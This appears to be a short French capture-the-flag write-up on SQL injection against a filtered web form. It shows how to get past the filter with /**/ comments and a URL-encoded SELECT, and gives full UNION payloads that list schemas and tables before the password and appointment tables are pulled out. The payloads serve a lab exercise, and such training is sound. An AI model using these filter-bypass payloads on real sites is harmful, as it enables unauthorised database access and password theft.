# Rencontres

Nous devons ici faire face à certain filtres. Le ```SELECT``` et les espaces ne sont pas autorisé par exemple.
En faisant un peut de recherche on tombe sur le site de [PortSwigger](https://portswigger.net/support/sql-injection-bypassing-common-filters).</br>
Nous trouvons en bas de la page comment faire pour qu'il n'y ai pas d'espaces dans la commande (utilisation de /\*\*/) et remplaçons le ```SELECT``` par ```%53%45%4c%45%43%54```. Ce qui nous donne : ```'/**/UNION/**/%53%45%4c%45%43%54/**/1,2,schema_name/**/from/**/INFORMATION_SCHEMA.SCHEMATA/**/#```</br>
![image](https://user-images.githubusercontent.com/73934639/174613360-b6ba38e9-5bd0-4935-b81b-8233f3474a0b.png)
</br>


On se dirige vers la base de donnée ```RencontreVendeurs``` (```'/**/UNION/**/%53%45%4c%45%43%54/**/1,TABLE_NAME,TABLE_SCHEMA/**/from/**/INFORMATION_SCHEMA.TABLES/**/where/**/table_schema='RencontreVendeurs'#```) : </br>
![image](https://user-images.githubusercontent.com/73934639/174613769-e79bbba4-078a-4c44-97b1-acc8c94fe47a.png)

Nous n'avons plus qu'à récupérer les informations de la table password et de la table date.</br>
Commençons par la table ```password``` (même étaps que pour la partie 2 mais avec le filtres):</br>
![image](https://user-images.githubusercontent.com/73934639/174615601-2d23ce63-41bf-40fe-818d-56ca7516da88.png)
</br>

Il ne nous reste plus que la table ```Rdv``` :</br>
![image](https://user-images.githubusercontent.com/73934639/174616019-ddd40ae8-1a8e-4091-98de-f6efb8abc94e.png)
</br>

Nous avons maintenant tout ce qu'il nous faut.
